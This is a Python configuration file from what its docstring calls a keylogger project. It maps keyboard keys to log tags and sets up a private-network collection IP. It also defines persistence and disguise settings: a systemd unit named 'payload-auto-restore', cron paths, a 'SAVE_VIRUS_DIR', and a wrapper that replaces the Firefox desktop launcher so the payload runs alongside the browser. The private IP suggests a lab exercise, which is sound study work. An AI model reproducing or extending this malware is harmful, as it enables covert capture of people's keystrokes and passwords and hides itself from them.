"""
@author: Vuong Van Duy

config.py
data: 14.10.2025

This module contains configuration constants and mappings for special keys used in the keylogger.
"""

from pynput.keyboard import Key

special_keys = {
    Key.space: " ",
    Key.enter: "\n",
    Key.backspace: "[BACKSPACE]",
    Key.ctrl: "[CTRL]",
    Key.esc: "[ESC]",
    Key.caps_lock: "[CAPSLOCK]",
    Key.shift: "[SHIFT]",
    Key.tab: "[TAB]",
    Key.delete: "[DELETE]",
    Key.up: "[UP]",
    Key.down: "[DOWN]",
    Key.left: "[LEFT]",
    Key.right: "[RIGHT]",
    Key.alt: "[ALT]",
    Key.cmd: "[CMD]",
    Key.f1: "[F1]",
    Key.f2: "[F2]",
    Key.f3: "[F3]",
    Key.f4: "[F4]",
    Key.f5: "[F5]",
    Key.f6: "[F6]",
    Key.f7: "[F7]",
    Key.f8: "[F8]",
    Key.f9: "[F9]",
    Key.f10: "[F10]",
}

IP = '10.0.2.4'

UNIT_NAME = 'payload-auto-restore.service'

UNIT_DIR = '~/.config/systemd/user'

BACKUP_DIR = "~/.cache/backups"

SAVE_VIRUS_DIR = "~/.cache/tmp"

CRON_DIR = "~/.config/cron"

BASH_SCRIPT_NAME = "cron-runner"

WRAPPER_SCRIPT_NAME = "firefox-with-companion"

WRAPPER_DIR = "~/.local/bin"

DESKTOP_NAME_OVERRIDE = "firefox.desktop"

DESKTOP_DIR_OVERRIDE = "/usr/share/applications"

FIREFOX_BIN = "/usr/lib/firefox/firefox"

LIST_NEW_FILES = []
